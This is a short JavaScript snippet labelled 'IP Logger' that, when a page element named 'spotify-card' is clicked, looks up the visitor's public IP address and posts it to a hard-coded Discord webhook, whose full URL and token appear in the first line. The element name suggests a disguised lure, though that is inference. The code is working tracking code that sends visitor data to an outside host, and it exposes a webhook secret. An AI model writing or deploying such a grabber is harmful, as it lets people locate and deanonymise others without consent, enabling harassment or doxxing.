const webhook = "https://discord.com/api/webhooks/1354893074702008360/VQ1E0H9PGmiF-dirC1SVYTzLvTMJ-G6TdJw_tUZ-hYdzdRkRVN3DFD0dOR330ZJn7KbF"; // change to your webhook

async function fetchIP() {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
}

async function sendToDiscord(ip) {
    const payload = {
        username: "IP Logger",
        content: `User's IP: ${ip}`
    };

    await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });

    alert('IP sent to Discord!');
}

document.getElementById("spotify-card").addEventListener("click", async () => {
    const ip = await fetchIP();
    await sendToDiscord(ip);
});
